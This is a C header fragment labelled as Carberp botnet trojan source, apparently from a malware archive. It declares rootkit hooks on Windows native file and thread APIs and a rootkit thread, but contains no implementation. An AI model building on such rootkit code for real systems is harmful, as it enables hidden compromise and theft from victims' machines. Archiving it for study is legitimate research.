/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

void HookZwQueryDirectoryFile();
void HookZwResumeThread();
void HookZwOpenFile();
void HookZwCreateFile();

DWORD WINAPI RootkitThread( LPVOID lpData );


void ProtectPage( LPVOID lpAddr, DWORD dwParams );